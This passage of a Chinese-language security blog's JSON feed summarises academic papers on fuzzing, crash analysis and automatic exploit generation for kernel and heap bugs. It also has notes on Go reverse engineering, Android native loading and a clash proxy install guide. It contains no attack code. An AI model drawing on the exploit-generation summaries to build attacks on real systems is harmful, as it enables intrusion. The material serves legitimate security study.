CPU程序的经验风险评估表明，我们的攻击原语在实践中可能是可行的。总的来说，我们的发现显示WebAssembly中可能令人惊讶地缺乏二进制安全性。我们讨论了潜在的保护机制，以减轻由此产生的风险。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtbGVobWFubi5wZGY=\">sec20-lehmann.pdf (usenix.org)</span></p>\n<h3 id=\"AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation\"><a href=\"#AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation\" class=\"headerlink\" title=\"AURORA: Statistical Crash Analysis for Automated Root Cause Explanation\"></a><strong>AURORA: Statistical Crash Analysis for Automated Root Cause Explanation</strong></h3><p>​\t鉴于自动化软件测试技术的巨大成功，在实践中发现了大量的崩溃。确定崩溃的根本原因是一项耗时的工作，会导致发现崩溃和修复底层软件故障之间的不平衡。为了解决这个问题，已经提出了依赖于诸如反向执行和向后污染分析等技术的各种方法。然而，这些技术要么局限于特定的故障类型，要么向分析人员提供组装指令，但没有上下文信息或对潜在故障的解释。</p>\n<p>​\t在本文中，我们提出了一种自动化分析方法，它不仅可以识别给定二进制可执行文件的崩溃输入的根本原因，还可以为分析人员提供有关崩溃输入特征的错误行为的上下文信息。从单个崩溃输入开始，我们生成一组不同的类似输入，这些输入要么使程序崩溃，要么诱发良性行为。然后，我们在执行每个找到的输入时跟踪程序的状态，并生成谓词，即捕获崩溃和非崩溃输入之间的行为差异的简单布尔表达式。对所有谓词的统计分析使我们能够确定确定根本原因的谓词，从而不仅揭示了根本原因的位置，而且还向分析人员提供了在该位置显示的崩溃行为的解释。我们在一个叫做AURORA的工具中实现了我们的方法，并对25个不同的软件故障进行了评估。我们的评估表明，AURORA甚至能够发现复杂bug的根本原因。例如，在开发人员修复和崩溃位置之间执行了数百万条指令的情况下，它成功了。与现有方法相比，AURORA还能够处理根本原因与崩溃之间没有数据依赖关系的错误，例如类型混淆错误。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjBmYWxsX2JsYXp5dGtvX3ByZXB1Yi5wZGY=\">sec20fall_blazytko_prepub.pdf (usenix.org)</span></p>\n<h3 id=\"KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities\"><a href=\"#KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities\" class=\"headerlink\" title=\"KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities\"></a><strong>KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities</strong></h3><p>​\t现代操作系统内核的整体性导致不断发现错误。 通常不清楚哪些错误值得修复，因为只有其中一部分可能严重到足以导致安全接管（即权限升级）。 因此，研究人员最近开始开发自动漏洞利用生成技术（针对 UAF bug）来协助 bug 分类过程。 在本文中，我们研究了 Linux 内核中的另一个顶级内存漏洞——堆中的越界（OOB）内存写入。 我们基于以下两个观察结果设计 KOOBE 来协助分析此类漏洞：(1) 令人惊讶的是，不同的 OOB 漏洞实例常常表现出广泛的功能。 (2) 内核漏洞利用本质上是多重交互的（即，漏洞利用涉及多个系统调用），这使得漏洞利用制作过程可以模块化。 具体来说，我们专注于提取 OOB 漏洞的功能，这将为后续的可利用性评估过程提供支持。 我们的系统构建在多个构建块上，包括用于发现隐藏功能的新型功能引导模糊解决方案，以及将功能组合在一起以进一步提高成功利用的可能性的方法。 在我们的评估中，我们通过详尽分析 17 个最新的 Linux 内核 OOB 漏洞（其中只有 5 个具有公开可用的漏洞）来证明 KOOBE 的适用性，其中 KOOBE 成功为其中 11 个漏洞生成了候选漏洞利用策略（包括 5 个没有公开的漏洞） 甚至分配了任何 CVE）。 随后，根据这些策略，我们能够为所有这些策略构建完全有效的漏洞利用。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtY2hlbi13ZWl0ZW5nLnBkZg==\">sec20-chen-weiteng.pdf (usenix.org)</span></p>\n<h3 id=\"Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives\"><a href=\"#Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives\" class=\"headerlink\" title=\"Automatic Techniques to Systematically Discover New Heap Exploitation Primitives\"></a><strong>Automatic Techniques to Systematically Discover New Heap Exploitation Primitives</strong></h3><p>滥用堆分配器元数据的利用技术因其通用性（即独立于应用程序）和强大功能（即绕过现代缓解措施）而被广泛研究。然而，这些技术通常被认为是艺术，因此发现它们的方法仍然是临时的、手动的和针对特定分配器的。</p>\n<p>在本文中，我们提出了一种自动工具 ArcHeap，用于系统地发现尚未开发的堆利用原语，而不管它们的底层实现是什么。ArcHeap 的主要理念是让计算机自主探索空间，其概念类似于模糊测试，方法是指定一组现代堆分配器的常见设计和漏洞根源作为模型，并提供堆操作和攻击能力作为动作。在探索过程中，ArcHeap 会检查这些操作的组合是否有可能用于构建漏洞利用原语，如任意写入或重叠块。作为证明，ArcHeap 会生成工作 PoC，演示所发现的利用技术。</p>\n<p>我们用 ptmalloc2 和其他 10 个分配器对 ArcHeap 进行了评估，在 ptmalloc2 中发现了 5 种以前未知的利用技术，并针对 10 个分配器中的 7 个（包括注重安全的分配器 DieHarder）发现了几种利用技术。为了证明 ArcHeap 方法在其他领域的有效性，我们还研究了安全特性和利用原语是如何在不同版本的 ptmalloc2 中演变的。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAteXVuLnBkZg==\">sec20-yun.pdf (usenix.org)</span></p>\n<h2 id=\"S-amp-P\"><a href=\"#S-amp-P\" class=\"headerlink\" title=\"S&amp;P\"></a>S&amp;P</h2><h3 id=\"Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware\"><a href=\"#Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware\" class=\"headerlink\" title=\"Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware\"></a>Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware</h3><ul>\n<li>基于污点分析的多二进制文件之间交互过程漏洞挖掘</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTE1Mjc5Ng==\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152796</span></li>\n</ul>\n<h3 id=\"SAVIOR-Towards-Bug-Driven-Hybrid-Testing\"><a href=\"#SAVIOR-Towards-Bug-Driven-Hybrid-Testing\" class=\"headerlink\" title=\"SAVIOR: Towards Bug-Driven Hybrid Testing\"></a>SAVIOR: Towards Bug-Driven Hybrid Testing</h3><ul>\n<li>传统的模糊测试加混合执行的方法会测试许多无意义的代码路径，SAVIOR能够推理出漏洞的可行性，筛选出更可行的程序执行路径。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTE1MjY4Mg==\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152682</span></li>\n</ul>\n<h3 id=\"Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis\"><a href=\"#Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis\" class=\"headerlink\" title=\"Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis\"></a>Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis</h3><ul>\n<li><p>使用自然语言处理和数据流分析等技术来对内存管理函数进行抽象，从而有效地检测定制化内存管理机制造成的内存破坏缺陷</p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cDovL2N5YmVyc2VjLnVzdGMuZWR1LmNuLzIwMjIvMDYwNi9jMjM4NDdhNTU3NDY3L3BhZ2UuaHRt\">http://cybersec.ustc.edu.cn/2022/0606/c23847a557467/page.htm</span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTgzMzYxMw==\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9833613</span></p>\n</li>\n</ul>\n<h3 id=\"SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration\"><a href=\"#SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration\" class=\"headerlink\" title=\"SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration\"></a>SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration</h3><ul>\n<li>能够将目标程序中的相关代码与不相关代码区分开来，这些代码不会触发目标代码中的漏洞。selectfuzz可以选择性地探索相关的程序路径，以实现高效的崩溃再现和漏洞检测。它确定了两种类型的相关代码-路径发散型代码和数据依赖型代码，它们分别捕获与目标代码的控制数据依赖关系。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWNsYWIuY3NlLmN1aGsuZWR1LmhrL3BhcGVycy9zcDIzX3NlbGVjdGZ1enoucGRm\">https://seclab.cse.cuhk.edu.hk/papers/sp23_selectfuzz.pdf</span></li>\n</ul>\n<h3 id=\"AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities\"><a href=\"#AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities\" class=\"headerlink\" title=\"AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities\"></a>AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities</h3><ul>\n<li>内核漏洞迁移</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLndvaGluLm1lL3Bvc3RzL3BhcGVyLWFlbS8=\">https://blog.wohin.me/posts/paper-aem/</span></li>\n</ul>\n<h2 id=\"NDSS\"><a href=\"#NDSS\" class=\"headerlink\" title=\"NDSS\"></a>NDSS</h2><h3 id=\"Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs\"><a href=\"#Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs\" class=\"headerlink\" title=\"Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs\"></a>Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs</h3><ul>\n<li>一种创新的解决方案，用于自动和精确地操作通用程序的堆布局</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmRzcy1zeW1wb3NpdW0ub3JnL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzAyL25kc3MyMDIzX3MyMzJfcGFwZXIucGRm\">https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s232_paper.pdf</span></li>\n</ul>\n<h2 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h2><h3 id=\"LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers\"><a href=\"#LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers\" class=\"headerlink\" title=\"LibAFL: A Framework to Build Modular and Reusable Fuzzers\"></a>LibAFL: A Framework to Build Modular and Reusable Fuzzers</h3><ul>\n<li>集成了多种常用的fuzz方案来进行</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuczMuZXVyZWNvbS5mci9kb2NzL2NjczIyX2Zpb3JhbGRpLnBkZg==\">https://www.s3.eurecom.fr/docs/ccs22_fioraldi.pdf</span></li>\n</ul>\n<h3 id=\"Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC\"><a href=\"#Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC\" class=\"headerlink\" title=\"Evocatio: Conjuring Bug Capabilities from a Single PoC\"></a>Evocatio: Conjuring Bug Capabilities from a Single PoC</h3><ul>\n<li>分析触发漏洞的原因，并自动生成触发漏洞的输入</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNTQ4NjA2LjM1NjA1NzU=\">https://dl.acm.org/doi/pdf/10.1145/3548606.3560575</span></li>\n</ul>\n<h3 id=\"Binary-Control-Flow-Trimming\"><a href=\"#Binary-Control-Flow-Trimming\" class=\"headerlink\" title=\"Binary Control-Flow Trimming\"></a>Binary Control-Flow Trimming</h3><ul>\n<li>提出了修剪无关代码的方法</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zMzE5NTM1LjMzNDU2NjU=\">https://dl.acm.org/doi/pdf/10.1145/3319535.3345665</span></li>\n</ul>\n<h3 id=\"Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters\"><a href=\"#Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters\" class=\"headerlink\" title=\"Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters\"></a>Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters</h3><ul>\n<li>自动化堆溢出利用方法<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Mub3guYWMudWsvdG9tLm1lbGhhbS9wdWIvSGVlbGFuLTIwMTktR01HLnBkZg==\">https://www.cs.ox.ac.uk/tom.melham/pub/Heelan-2019-GMG.pdf</span></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels\"><a href=\"#Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels\" class=\"headerlink\" title=\"Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels\"></a>Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels</h3><ul>\n<li>采用基于摘要的新型高阶污点流构建方法来有效地枚举交叉输入污点流</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNDYwMTIwLjM0ODQ3OTg=\">3460120.3484798 (acm.org)</span></li>\n</ul>\n<h3 id=\"Learning-to-Explore-Paths-for-Symbolic-Execution\"><a href=\"#Learning-to-Explore-Paths-for-Symbolic-Execution\" class=\"headerlink\" title=\"Learning to Explore Paths for Symbolic Execution\"></a>Learning to Explore Paths for Symbolic Execution</h3><ul>\n<li>Learch，能够有效地选择有希望的状态进行符号执行，以解决路径爆炸问题</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9maWxlcy5zcmkuaW5mLmV0aHouY2gvd2Vic2l0ZS9wYXBlcnMvY2NzMjEtbGVhcmNoLnBkZg==\">ccs21-learch.pdf (ethz.ch)</span></li>\n</ul>\n<h3 id=\"Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis\"><a href=\"#Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis\" class=\"headerlink\" title=\"Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis\"></a>Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis</h3><ul>\n<li>基于执行轨迹的符号重构状态的漏洞挖掘方法，以更好地检测和分析用户程序及其导入库中的溢出、使用后释放、双重释放和格式化字符串漏洞的根本原因</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNDYwMTIwLjM0ODUzNjM=\">3460120.3485363 (acm.org)</span></li>\n</ul>\n<h2 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra\"></a>Extra</h2><h3 id=\"From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel\"><a href=\"#From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel\" class=\"headerlink\" title=\"From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel\"></a>From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel</h3><ul>\n<li>提出了一种多功能的利用策略，可以将弱利用原语转换为强利用原语</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTk3MDM3Ng==\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9970376</span></li>\n</ul>\n<h3 id=\"Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths\"><a href=\"#Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths\" class=\"headerlink\" title=\"Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths\"></a>Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths</h3><ul>\n<li>一个自动生成用户空间 UAF 漏洞利用的系统，能够自动化构建需要的堆布局</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9MTAwNTMyNDI=\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242</span></li>\n</ul>\n<h3 id=\"Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\"><a href=\"#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\" class=\"headerlink\" title=\"Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs\"></a>Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs</h3><ul>\n<li>识别原语的新方法</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9MTAwNTMyNDI=\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242</span></li>\n</ul>\n<hr>\n<p>- </p>\n",
            "tags": [
                "Paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/",
            "url": "https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/",
            "title": "AEG_reviwer",
            "date_published": "2023-08-21T06:40:17.000Z",
            "content_html": "<h2 id=\"Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\"><a href=\"#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\" class=\"headerlink\" title=\"Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs\"></a>Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs</h2><hr>\n<p>文章贡献：</p>\n<ul>\n<li>提出了primitive-crucialbehaviors analysis  ，该方法用于在符号执行过程中查找关键执行结构</li>\n<li>利用模糊测试和符号执行设计了一套攻击原语确定方法</li>\n<li>设计DEPA方法用于检测堆溢出相关原语</li>\n</ul>\n<p>文章提出了一种新的堆溢出漏洞原语的查找方法DEPA，基于以下两种技术：</p>\n<ul>\n<li>primitive-crucial-behavior analysis module <ul>\n<li>该模块对目标程序进行符号执行，在执行过程中进行primitive-crucial-behavior analysis（关键原语行为分析）</li>\n<li>primitive-crucial-behavior   ：实现原语的关键结构，此类结构往往与程序语义以及系统API有关<ul>\n<li>如何精准识别这些结构？</li>\n<li>如何利用该结构进行漏洞的发现？</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>exploit primitive determination method  ：</li>\n</ul>\n<p><strong>事件循环驱动（event loop driven）</strong>：例如通过交互式进行功能分发的程序，此类程序在一次运行过程中接收一次输入，选择一种处理方式，而后结束。在对此类程序分析的过程中很难使用fuzzing或者符号执行的方法来探索程序的深层状态。</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/03/android-framework/",
            "url": "https://alazymechnaic.github.io/2023/08/03/android-framework/",
            "title": "android_framework",
            "date_published": "2023-08-03T15:22:19.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/20/go-reverse/",
            "url": "https://alazymechnaic.github.io/2023/07/20/go-reverse/",
            "title": "go_reverse",
            "date_published": "2023-07-20T11:50:06.000Z",
            "content_html": "<h2 id=\"GO-reverse\"><a href=\"#GO-reverse\" class=\"headerlink\" title=\"GO  reverse\"></a>GO  reverse</h2><hr>\n<h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>​\tGO语言是谷歌开发的强类型静态静态语言，其编译出的汇编代码与 C/ C++语言存在极大的差异。本身Go在编译过程中将所有的库函数和第三方包都进行了静态的打包操作，还打包进去了自身的runtime和（Garbage Collection， 垃圾回收）模块部分代码，导致其编译后的二进制文件体积十分庞大，存在较大的分析难度。</p>\n<h3 id=\"Go语言特性\"><a href=\"#Go语言特性\" class=\"headerlink\" title=\"Go语言特性\"></a>Go语言特性</h3><ul>\n<li><strong>独有的数据表示方式</strong>： 例如String类型使用，（start_address，length）二元组进行表示，导致其在进行函数调用时，传入的内容由原本C中的字符串地址变为了两个参数。</li>\n<li><strong>独有的栈管理机制</strong>：Go语言中的栈使用continue stack机制，每个runtime在初始状态下分配一个较小的区域当做栈，每次运行时如果栈不够用了就再申请一个更大的栈，将旧栈中的内容复制进去。</li>\n<li><strong>全静态链接</strong>：程序中并不按照函数名对库函数进行动态使用，而是进行全静态链接，在没有调试信息和符号表的情况下调试难度很大</li>\n<li><strong>独有的函数调用机制</strong>：Go语言函数中的callee的栈空间由caller来进行管理，caller在进入callee之前预先将栈中把参数留出，同时还要给返回值留出栈空间</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci5odG1sP21lbWJlcklkPTEyMjA3OQ==\">https://www.anquanke.com/member.html?memberId=122079</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TWpNNU5UYzJNRFl4TXc9PSZtaWQ9MjQ1ODM4NzExNiZpZHg9MSZzbj1jNjY4ZGFlYTMwYmM5ZGNlOGQ3OWQzMTZlOTM5OTNlNCZjaGtzbT1iMThmMzIyNjg2ZjhiYjMwZTgxYjc0NjQ0NmYwOGRjZDM4MWE1ODhiNWMwYzZiODQyMDA3Y2M4MjJhODc1YmQ1ZWQxNGMyZDc0ZDZhJnNjZW5lPTI3\">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458387116&amp;idx=1&amp;sn=c668daea30bc9dce8d79d316e93993e4&amp;chksm=b18f322686f8bb30e81b746446f08dcd381a588b5c0c6b842007cc822a875bd5ed14c2d74d6a&amp;scene=27</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xlYW5vdGUuY29tL2Jsb2cvcG9zdC81YzY0YmIyYmFiNjQ0MTUxNjcwMDBmNDg=\">http://leanote.com/blog/post/5c64bb2bab64415167000f48</span></p>\n",
            "tags": [
                "go, RE"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/20/android-basic/",
            "url": "https://alazymechnaic.github.io/2023/07/20/android-basic/",
            "title": "Android_Basic",
            "date_published": "2023-07-20T11:07:47.000Z",
            "content_html": "<h2 id=\"本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\"><a href=\"#本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\" class=\"headerlink\" title=\"本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\"></a>本文用于介绍安卓基础架构以及安卓安全的学习方法及路线</h2><ul>\n<li>采用课程与笔记相结合的方式</li>\n<li>移动安全课程<ul>\n<li>看完这些课程就行，每天一节，方便以后找工作</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5iNDExZjc3Ny8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2s=\">https://www.bilibili.com/video/BV1nb411f777/?spm_id_from=333.337.search-card.all.click</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXQzNDExdTdjcC8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2s=\">https://www.bilibili.com/video/BV1t3411u7cp/?spm_id_from=333.337.search-card.all.click</span></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"安卓程序的代码加载顺序\"><a href=\"#安卓程序的代码加载顺序\" class=\"headerlink\" title=\"安卓程序的代码加载顺序\"></a>安卓程序的代码加载顺序</h3><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231122223143885.png\" alt=\"image-20231122223143885\"></p>\n<p>java层在使用native层函数时，首先要使用system.loadLibrary函数，最终调用dlopen去加载文件</p>\n<p>在加载成功后首先会加载.init函数和在.init_array列表中的函数，然后再进行程序主要逻辑的执行，这些函数中包含了对程序中的解密，解压缩等操作，应该重点关注。后面就是正常的start和main</p>\n<p>JNI_Onload对jni进行初始化，让native层执行java层的代码</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231122223818379.png\" alt=\"image-20231122223818379\"></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/14/clash-build/",
            "url": "https://alazymechnaic.github.io/2023/07/14/clash-build/",
            "title": "clash_build",
            "date_published": "2023-07-14T02:14:42.000Z",
            "content_html": "<h2 id=\"Clash-Install\"><a href=\"#Clash-Install\" class=\"headerlink\" title=\"Clash Install\"></a>Clash Install</h2><hr>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 下载clash</span>\n<span class=\"token function\">wget</span> <span class=\"token parameter variable\">-O</span> clash.gz https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v1.13.0.gz\n<span class=\"token comment\"># 解压</span>\ngunzip <span class=\"token parameter variable\">-d</span> clash.gz\n<span class=\"token function\">sudo</span> <span class=\"token function\">chmod</span> +x clash\n<span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> /opt/clash\n<span class=\"token function\">sudo</span> <span class=\"token function\">mv</span> clash /opt/clash\n<span class=\"token builtin class-name\">cd</span> /opt/clash\n<span class=\"token comment\"># 下载配置文件</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">wget</span> https://github.com/Dreamacro/maxmind-geoip/releases/download/20230612/Country.mmdb\n<span class=\"token comment\"># config.yaml中存放的是</span>\n<span class=\"token comment\"># 这里的配置文件需要clash的订阅文件，可以在客户端里找到</span>\n<span class=\"token function\">mv</span> /home/harry/1688348600374.yml ./config.yaml \n./clash <span class=\"token parameter variable\">-f</span> config.yaml\n<span class=\"token comment\"># 保证clash后台运行</span>\n<span class=\"token function\">cp</span> Country.mmdb config.yaml ~/.config/clash\n<span class=\"token function\">nohup</span> ./clash <span class=\"token parameter variable\">-f</span> config.yaml <span class=\"token operator\">&amp;</span>\n<span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> clash\n\n<span class=\"token comment\"># 设置代理</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">http_proxy</span><span class=\"token operator\">=</span>http://127.0.0.1:7890 \n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">https_proxy</span><span class=\"token operator\">=</span>http://127.0.0.1:7890\n<span class=\"token comment\"># 里面编辑上述内容</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> ~/.bashrc\n<span class=\"token builtin class-name\">source</span> ~/.bashrc\n<span class=\"token comment\"># 如果想取消就是用下面命令</span>\n<span class=\"token builtin class-name\">unset</span> http_proxy\n<span class=\"token builtin class-name\">unset</span> https_proxy\n <span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token builtin class-name\">pwd</span><span class=\"token variable\">)</span></span>/depot_tools:<span class=\"token environment constant\">$PATH</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"BUG\"><a href=\"#BUG\" class=\"headerlink\" title=\"BUG\"></a>BUG</h3><h4 id=\"重启后没有图形化界面\"><a href=\"#重启后没有图形化界面\" class=\"headerlink\" title=\"重启后没有图形化界面\"></a>重启后没有图形化界面</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 重新安装图形化界面</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> update\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> 